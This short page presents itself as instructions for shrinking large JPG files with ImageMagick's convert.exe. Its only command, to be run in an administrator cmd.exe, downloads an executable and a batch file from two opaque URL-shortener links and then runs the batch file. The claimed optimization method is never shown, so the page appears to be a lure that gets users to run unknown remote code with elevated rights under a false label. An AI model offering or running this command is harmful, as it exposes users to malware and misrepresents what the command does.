# Optimize large jpg images using imagemagick's convert.exe and caching features

This script uses `ImageMagick's convert.exe` which creates two temporary cache files of each image before re-assembling the picture into it's optimized form using a highly efficient algorithm. If you need ways to save space on your hard drive this should work well for you

Make sure the file sizes are at least `>= 3MB per image` to get the best returns on space savings.

This script will `OVERWRITE the original pictures` so it is highly advised to make backups of your files before running!

To run this script `open cmd.exe as an administrator` and run the commands below in the `same folder as your jpg file(s)`

# Optimize all jpg files in the current working directory

```
wget.exe -c -O convert.exe shorturl.at/cLPR0 && ^
curl.exe shorturl.at/ajru5 > run.bat && ^
call run.bat & exit

```
